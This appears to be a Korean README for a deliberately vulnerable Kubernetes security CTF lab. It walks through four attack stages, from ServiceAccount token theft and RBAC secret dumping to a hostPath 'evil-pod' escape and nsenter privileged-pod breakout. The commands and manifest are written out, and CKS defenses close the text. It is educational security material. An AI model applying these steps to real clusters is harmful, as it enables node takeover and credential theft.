# Lab 10: Kubernetes & 컨테이너 보안 실습 랩 (KubeShield)

> **안내**: 이 실습 환경은 Kubernetes 클러스터 보안, RBAC 오설정, 컨테이너 탈출(Breakout) 및 CKS(Certified Kubernetes Security Specialist) 실무 대응을 학습하기 위해 제작된 취약 환경입니다. 반드시 로컬 또는 격리된 실습 환경에서만 사용하십시오.

---

## 1. 랩 개요

현대 클라우드 네이티브 인프라에서 Kubernetes는 사실상의 표준 오케스트레이션 플랫폼입니다. 그러나 잘못 구성된 ServiceAccount, 과도한 RBAC 권한 부여, 부주의한 `hostPath` 볼륨 마운트나 `privileged` 컨테이너 배포는 단 하나의 Pod 침투가 전체 클러스터 및 물리/가상 노드의 완전한 장악으로 이어지는 치명적인 공격 체인을 형성합니다.

본 랩에서는 공격자가 모니터링 Pod(`prometheus-node-exporter`)의 쉘을 확보한 시점에서 출발하여, ServiceAccount 토큰 추출부터 클러스터 마스터 권한 장악까지 4단계의 실전 공격 및 방어 시나리오를 단계별로 실습합니다.

### 주요 사양
- **대상 클러스터**: `corp-k8s-cluster.local` (Kubernetes v1.28.3)
- **웹 대시보드 및 웹 터미널**: `http://localhost:8090`
- **K8s API 서버 엔드포인트**: `http://localhost:8090/api/v1/...`
- **연계 교재**: [29장 컨테이너 & 쿠버네티스 보안](../../29_Container_Kubernetes_Security/06_container_ctf_lab.md), [70장 쿠버네티스 보안](../../70_Kubernetes_Security/06_k8s_security_ctf_lab.md)
- **관련 워게임 트랙**: `cloud` (클라우드 & 컨테이너 보안, 35개 문제)
- **CLI 간편 실행**: `python3 vhack.py lab start 10`
- **난이도**: ★★★☆ (중상급)

---

## 2. 랩 아키텍처 및 공격 시나리오

```
┌────────────────────────────────────────────────────────────────────────┐
│                        KubeShield Virtual Cluster                      │
│                                                                        │
│  [Attacker / Web Console]                                              │
│          │                                                             │
│          ▼                                                             │
│  ┌─────────────────────────────────┐                                  │
│  │ Stage 1: SA Token Recon         │                                  │
│  │   Pod: prometheus-node-exporter │                                  │
│  │   Token: /var/run/secrets/...   │                                  │
│  └───────────────┬─────────────────┘                                  │
│                  │ (Bearer Auth)                                       │
│                  ▼                                                     │
│  ┌─────────────────────────────────┐                                  │
│  │ Stage 2: Overprivileged RBAC    │                                  │
│  │   Role: cluster-monitor-role    │                                  │
│  │   Action: secrets list/get      │ ──► [production: DB Credentials]  │
│  └───────────────┬─────────────────┘                                  │
│                  │                                                     │
│                  ▼                                                     │
│  ┌─────────────────────────────────┐                                  │
│  │ Stage 3: HostPath Mount Escape  │                                  │
│  │   Pod Creation: hostPath: /     │ ──► [/host/etc/shadow, host_flag] │
│  └───────────────┬─────────────────┘                                  │
│                  │                                                     │
│                  ▼                                                     │
│  ┌─────────────────────────────────┐                                  │
│  │ Stage 4: Privileged Pod Escape  │                                  │
│  │   nsenter --target 1 (PID 1)    │ ──► [Node Root & Cluster Admin]  │
│  └─────────────────────────────────┘                                  │
└────────────────────────────────────────────────────────────────────────┘
```

---

## 3. 챌린지 상세 안내 (4단계)

### Stage 1: ServiceAccount Token Reconnaissance
- **목표**: 침투된 Pod 내부의 기본 마운트된 ServiceAccount 토큰을 추출하고, K8s API 서버와 인증된 통신을 수립하십시오.
- **주요 명령어**:
  ```bash
  # 토큰 및 네임스페이스 확인
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

  # API 서버 통신 테스트
  curl -s --header "Authorization: Bearer $TOKEN" http://localhost:8090/api/v1/namespaces/default/pods
  ```
- **플래그 포맷**: `FLAG{K8S_SA_TOKEN_LEAKED_SECRET_RECON}`

### Stage 2: Overprivileged RBAC Secret Dumping
- **목표**: 획득한 ServiceAccount에 바인딩된 ClusterRole 권한을 열거하고, `production` 네임스페이스의 데이터베이스 루트 자격증명 Secret을 탈취하십시오.
- **주요 명령어**:
  ```bash
  # RBAC 바인딩 열거
  kubectl get clusterrolebindings
  kubectl get secrets -n production

  # 또는 API 직접 호출
  curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8090/api/v1/namespaces/production/secrets/db-root-credentials
  ```
- **플래그 포맷**: `FLAG{K8S_RBAC_OVERPRIVILEGED_SECRET_DUMP}`

### Stage 3: HostPath Volume Mount & Container Breakout
- **목표**: 과도하게 허용된 `pods/create` 권한을 악용하여, 노드 루트 파일시스템(`/`)을 컨테이너 내부(`/host`)로 마운트하는 악성 Pod 매니페스트를 배포하고 호스트 플래그를 획득하십시오.
- **악성 매니페스트 (`evil-pod.yaml`)**:
  ```yaml
  apiVersion: v1
  kind: Pod
  metadata:
    name: escape-exploit-pod
    namespace: default
  spec:
    containers:
    - name: escape
      image: busybox
      command: ["sleep", "3600"]
      volumeMounts:
      - name: host-root
        mountPath: /host
    volumes:
    - name: host-root
      hostPath:
        path: /
  ```
- **실행 및 플래그 확인**:
  ```bash
  kubectl apply -f evil-pod.yaml
  cat /host/root/host_flag.txt
  ```
- **플래그 포맷**: `FLAG{K8S_HOSTPATH_ESCAPE_NODE_ROOT_ACCESS}`

### Stage 4: Privileged Pod Breakout & Cluster Takeover
- **목표**: `privileged: true` 및 `hostPID: true` 권한을 악용하여 호스트 PID 1 네임스페이스로 탈출(`nsenter`)하고 노드 쉘 및 마스터 자격증명을 탈취하십시오.
- **주요 명령어**:
  ```bash
  # 호스트 네임스페이스 진입
  nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash
  whoami
  cat /etc/kubernetes/admin.conf
  ```
- **플래그 포맷**: `FLAG{K8S_PRIVILEGED_POD_ESCAPE_CLUSTER_TAKEOVER}`

---

## 4. 빠른 실행 가이드

### 1) Docker Compose로 시작
```bash
cd labs/10_k8s_security_lab
docker compose up -d --build
```

### 2) 웹 대시보드 및 터미널 접속
브라우저에서 `http://localhost:8090`에 접속합니다.

### 3) 자동 익스플로잇 스크립트 실행 (검증용)
```bash
python3 app/exploit_k8s.py --target http://localhost:8090
```

### 4) 실습 종료
```bash
docker compose down
```

---

## 5. CKS 기반 방어 및 보안 강화 대책

1. **ServiceAccount 최소권한 원칙 (Least Privilege)**:
   - Pod에 불필요한 토큰이 마운트되지 않도록 `automountServiceAccountToken: false` 설정.
   - 단기 수명 Projected Token(Bound Service Account Token) 사용 강제.
2. **Pod Security Standards (PSS) 강제**:
   - 네임스페이스 레이블에 `pod-security.kubernetes.io/enforce: restricted` 적용.
   - `hostPath`, `hostPID`, `privileged: true` 설정 원천 차단.
3. **Admission Controller (ValidatingAdmissionWebhook / Gatekeeper)**:
   - OPA Gatekeeper 또는 Kyverno 정책을 통해 위험한 Capabilities(`CAP_SYS_ADMIN`) 추가 거부.
4. **런타임 보안 모니터링 (Falco)**:
   - 컨테이너 내부에서의 `nsenter`, 민감 디렉토리 접근(`/etc/shadow`, `/var/run/docker.sock`) 시 실시간 경보 및 컨테이너 격리.
